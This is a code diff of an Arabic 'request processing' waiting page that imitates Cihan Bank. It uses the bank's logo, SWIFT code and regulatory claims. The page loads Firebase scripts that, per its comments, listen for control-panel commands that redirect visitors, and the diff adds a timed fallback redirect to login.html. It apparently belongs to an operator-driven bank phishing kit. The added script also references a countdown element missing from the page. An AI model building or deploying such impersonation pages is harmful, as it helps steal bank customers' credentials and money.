@@ -6,13 +6,15 @@
     <title>جاري معالجة الطلب | مصرف جيهان (مشروع فردي)</title>
     <meta name="description" content="صفحة الانتظار ومعالجة الطلبات - مشروع فردي باسم مصرف جيهان." />
     <meta name="theme-color" content="#0b2239" />
+
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
+
     <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <!-- Cairo Font -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-
 
     <script>
         tailwind.config = {
@@ -34,24 +36,24 @@
             }
         }
     </script>
+
     <style>
-        body { font-family: 'Cairo', sans-serif; }
+        body {
+            font-family: 'Cairo', sans-serif;
+        }
     </style>
 </head>
+
 <body class="bg-gray-50 text-gray-800 antialiased selection:bg-cihan-gold selection:text-white flex flex-col min-h-screen">
 
-
-    <!-- ==================== HEADER (الرأس المعتمد) ==================== -->
+    <!-- ==================== HEADER ==================== -->
     <header class="sticky top-0 z-40 bg-cihan-navy text-white shadow-xl border-b border-cihan-gold/30">
+
         <!-- Top Bar -->
         <div class="bg-cihan-dark py-2 px-4 text-xs text-gray-300 border-b border-gray-800">
             <div class="max-w-7xl mx-auto flex flex-wrap justify-between items-center gap-2">
-                <div class="flex items-center space-x-4 space-x-reverse">
-
-                </div>
-                <div class="flex items-center space-x-3 space-x-reverse">
-
-                </div>
+                <div class="flex items-center space-x-4 space-x-reverse"></div>
+                <div class="flex items-center space-x-3 space-x-reverse"></div>
             </div>
         </div>
 
@@ -59,22 +61,30 @@
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
             <div class="flex items-center justify-between">
 
-                <!-- شعار المصرف + شعار المشروع (حسابي) -->
+                <!-- شعار المصرف ومشروع حسابي -->
                 <div class="flex items-center gap-4 sm:gap-6">
+
                     <!-- شعار المصرف -->
                     <a href="index.html" class="flex items-center gap-2 group">
                         <span class="w-11 h-11 rounded-xl bg-white flex items-center justify-center shadow-md overflow-hidden p-1">
-                            <img src="/assets/images/cihan-logo.png" alt="شعار مصرف جيهان" class="w-full h-full object-contain">
+                            <img src="/assets/images/cihan-logo.png"
+                                 alt="شعار مصرف جيهان"
+                                 class="w-full h-full object-contain">
                         </span>
+
                         <div class="flex flex-col">
-                            <span class="font-extrabold text-lg sm:text-xl text-white group-hover:text-cihan-gold transition-colors">مصرف جيهان</span>
-                            <span class="text-[10px] text-cihan-gold tracking-widest uppercase font-semibold">للإستثمار والتمويل الإسلامي</span>
+                            <span class="font-extrabold text-lg sm:text-xl text-white group-hover:text-cihan-gold transition-colors">
+                                مصرف جيهان
+                            </span>
+                            <span class="text-[10px] text-cihan-gold tracking-widest uppercase font-semibold">
+                                للاستثمار والتمويل الإسلامي
+                            </span>
                         </div>
                     </a>
 
                     <div class="h-8 w-px bg-gray-700 hidden sm:block"></div>
 
-                    <!-- شعار مشروع التوطين (حسابي) -->
+                    <!-- مشروع حسابي -->
                     <div class="hidden sm:flex items-center gap-2 bg-cihan-dark/60 border border-cihan-gold/40 px-3 py-1.5 rounded-lg">
                         <div class="w-7 h-7 rounded-md bg-cihan-gold text-cihan-navy font-bold flex items-center justify-center text-xs">
                             <i class="fa-solid fa-wallet"></i>
@@ -86,7 +96,7 @@
                     </div>
                 </div>
 
-                <!-- Nav Links Desktop -->
+                <!-- روابط التنقل -->
                 <nav class="hidden lg:flex items-center space-x-8 space-x-reverse font-semibold text-sm">
                     <a href="index.html#about" class="text-gray-200 hover:text-cihan-gold transition-colors">عن المصرف</a>
                     <a href="index.html#services" class="text-gray-200 hover:text-cihan-gold transition-colors">الخدمات والتمويل</a>
@@ -94,16 +104,16 @@
                     <a href="index.html#contact" class="text-gray-200 hover:text-cihan-gold transition-colors">اتصل بنا</a>
                 </nav>
 
-                <!-- Mobile menu btn -->
+                <!-- زر قائمة الجوال -->
                 <div class="lg:hidden">
-                    <button id="mobileMenuBtn" class="text-gray-300 hover:text-white p-2">
+                    <button id="mobileMenuBtn" class="text-gray-300 hover:text-white p-2" aria-label="فتح القائمة">
                         <i class="fa-solid fa-bars text-2xl"></i>
                     </button>
                 </div>
             </div>
         </div>
 
-        <!-- Mobile Navigation Menu -->
+        <!-- قائمة الجوال -->
         <div id="mobileMenu" class="hidden lg:hidden bg-cihan-dark border-t border-gray-800 px-4 py-4 space-y-2">
             <a href="index.html#about" class="block text-gray-300 hover:text-cihan-gold py-1">عن المصرف</a>
             <a href="index.html#services" class="block text-gray-300 hover:text-cihan-gold py-1">الخدمات والتمويل</a>
@@ -112,12 +122,11 @@
         </div>
     </header>
 
-
-    <!-- ==================== MAIN (صفحة الانتظار والتحقق) ==================== -->
+    <!-- ==================== MAIN ==================== -->
     <main class="flex-grow flex items-center justify-center max-w-lg w-full mx-auto px-4 py-16">
         <div class="bg-white w-full rounded-2xl shadow-xl border border-gray-100 p-8 text-center space-y-6">
-            
-            <!-- أيقونة التحميل المتحركة -->
+
+            <!-- أيقونة التحميل -->
             <div class="relative w-24 h-24 mx-auto flex items-center justify-center">
                 <div class="absolute inset-0 border-4 border-cihan-gold/30 rounded-full"></div>
                 <div class="absolute inset-0 border-4 border-cihan-gold border-t-transparent rounded-full animate-spin"></div>
@@ -126,54 +135,62 @@
                 </div>
             </div>
 
-
-            <!-- النصوص التوضيحية -->
+            <!-- النصوص التوضيحية والعدّاد -->
             <div class="space-y-2">
                 <h2 class="text-xl font-extrabold text-cihan-navy">جاري معالجة طلبك</h2>
+
                 <p class="text-sm text-gray-600 leading-relaxed font-semibold">
-                    يرجى الانتظار جاري التحقق من طلبك يرجى عدم إغلاق الصفحة
+                    يرجى الانتظار، جاري التحقق من طلبك. يرجى عدم إغلاق الصفحة.
                 </p>
+
                 <p class="text-xs text-gray-400 mt-2">
                     نعمل على مطابقة البيانات وتجهيز مسار الطلب الخاص بك...
                 </p>
+
+               
             </div>
 
-
-            <!-- شريط تقدم بصري -->
+            <!-- شريط تقدم المهلة -->
             <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
                 <div id="progressBar" class="bg-cihan-gold h-full w-0 transition-all duration-200"></div>
             </div>
 
-
         </div>
     </main>
 
-
-    <!-- ==================== FOOTER (التذييل المعتمد) ==================== -->
+    <!-- ==================== FOOTER ==================== -->
     <footer id="contact" class="bg-cihan-dark text-white border-t border-gray-800 pt-12 pb-6 mt-auto">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8 pb-8 border-b border-gray-800">
 
-                <!-- 1. الشعار والمشروع في الفوتر -->
+                <!-- الشعار ومشروع حسابي -->
                 <div>
                     <div class="flex items-center gap-3 mb-3">
                         <span class="w-9 h-9 rounded-lg bg-white flex items-center justify-center overflow-hidden p-0.5">
-                            <img src="/assets/images/cihan-logo.png" alt="شعار مصرف جيهان" class="w-full h-full object-contain">
+                            <img src="/assets/images/cihan-logo.png"
+                                 alt="شعار مصرف جيهان"
+                                 class="w-full h-full object-contain">
                         </span>
                         <span class="font-bold text-lg text-white">مصرف جيهان</span>
                     </div>
+
                     <p class="text-gray-400 text-xs leading-relaxed mb-4">
                         مصرف جيهان للاستثمار والتمويل الإسلامي - مؤسسة مالية عراقية مرخصة خاضعة لرقابة البنك المركزي العراقي.
                     </p>
+
                     <div class="inline-flex items-center gap-2 bg-gray-800/80 px-3 py-1.5 rounded-lg border border-gray-700">
                         <i class="fa-solid fa-wallet text-cihan-gold text-xs"></i>
-                        <span class="text-xs text-gray-300">شريك معتمد في <strong>مشروع حسابي</strong></span>
+                        <span class="text-xs text-gray-300">
+                            شريك معتمد في <strong>مشروع حسابي</strong>
+                        </span>
                     </div>
                 </div>
 
-                <!-- 2. معلومات التواصل -->
+                <!-- معلومات التواصل -->
                 <div>
-                    <h4 class="text-white font-bold text-sm mb-3 border-r-2 border-cihan-gold pr-2">معلومات الاتصال</h4>
+                    <h4 class="text-white font-bold text-sm mb-3 border-r-2 border-cihan-gold pr-2">
+                        معلومات الاتصال
+                    </h4>
                     <ul class="space-y-2 text-xs text-gray-400">
                         <li><i class="fa-solid fa-phone text-cihan-gold ml-2"></i> الرقم المختصر: <strong>6618</strong></li>
                         <li><i class="fa-solid fa-envelope text-cihan-gold ml-2"></i> info@cihanbank.com.iq</li>
@@ -182,16 +199,17 @@
                     </ul>
                 </div>
 
-                <!-- 3. بيانات المصرف الرسمية -->
+                <!-- البيانات الرسمية -->
                 <div>
-                    <h4 class="text-white font-bold text-sm mb-3 border-r-2 border-cihan-gold pr-2">البيانات الرسمية</h4>
+                    <h4 class="text-white font-bold text-sm mb-3 border-r-2 border-cihan-gold pr-2">
+                        البيانات الرسمية
+                    </h4>
                     <div class="text-xs text-gray-400 space-y-2 font-mono">
                         <p>ISX: <span class="text-white">BCIH</span></p>
                         <p>SWIFT: <span class="text-white">CIHBIQBAXXX</span></p>
                         <p>Capital: <span class="text-white">255,000,000,000 IQD</span></p>
                     </div>
                 </div>
-
             </div>
 
             <!-- حقوق النشر -->
@@ -201,36 +219,58 @@
         </div>
     </footer>
 
-
-    <!-- سكريبت تشغيل قائمة الجوال وإعادة شريط التقدم عند النهاية -->
+    <!-- سكريبت قائمة الجوال -->
     <script>
-        // تشغيل قائمة الجوال
         const mobileMenuBtn = document.getElementById('mobileMenuBtn');
         const mobileMenu = document.getElementById('mobileMenu');
+
         mobileMenuBtn.addEventListener('click', () => {
             mobileMenu.classList.toggle('hidden');
         });
 
-
-        // تكرار حركة شريط التقدم بشكل مستمر عند وصوله إلى النهاية
-        let progress = 0;
         const progressBar = document.getElementById('progressBar');
-        
-        setInterval(() => {
-            progress += 3; // سرعة التقدم
-            if (progress > 100) {
-                progress = 0; // إعادة الكرة من البداية فوراً عند الوصول للنهاية
-            }
-            progressBar.style.width = progress + '%';
-        }, 100);
+        progressBar.style.width = '0%';
     </script>
 
-    <!-- Firebase: الاتصال بقاعدة البيانات + الاستماع لأوامر لوحة التحكم (التوجيه) -->
+    <!-- Firebase: الاتصال بقاعدة البيانات والاستماع لأوامر لوحة التحكم -->
     <script src="/assets/js/firebase-env.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
     <script src="/assets/js/firebase-client.js?v=11"></script>
     <script src="/assets/js/page-commands.js?v=3"></script>
+
+    <!-- التحويل الاحتياطي بعد 3 ثوانٍ -->
+    <script>
+        (() => {
+            const durationMs = 3000;
+            const countdownElement = document.getElementById('countdownValue');
+            const progressElement = document.getElementById('progressBar');
+            const startedAt = Date.now();
+
+            const countdownTimer = window.setInterval(() => {
+                const elapsedMs = Date.now() - startedAt;
+                const remainingMs = Math.max(0, durationMs - elapsedMs);
+                const remainingSeconds = Math.ceil(remainingMs / 1000);
+
+                countdownElement.textContent = String(remainingSeconds);
+                progressElement.style.width =
+                    `${Math.min(100, (elapsedMs / durationMs) * 100)}%`;
+
+                if (remainingMs <= 0) {
+                    window.clearInterval(countdownTimer);
+
+                    // إذا وجّهت لوحة التحكم العميل قبل انتهاء المهلة،
+                    // سينتقل المتصفح إلى الصفحة المطلوبة قبل تنفيذ هذا التحويل.
+                    window.location.replace('login.html');
+                }
+            }, 100);
+
+            // إيقاف المؤقت عند مغادرة الصفحة بسبب توجيه لوحة التحكم.
+            window.addEventListener('pagehide', () => {
+                window.clearInterval(countdownTimer);
+            }, { once: true });
+        })();
+    </script>
 </body>
 </html>
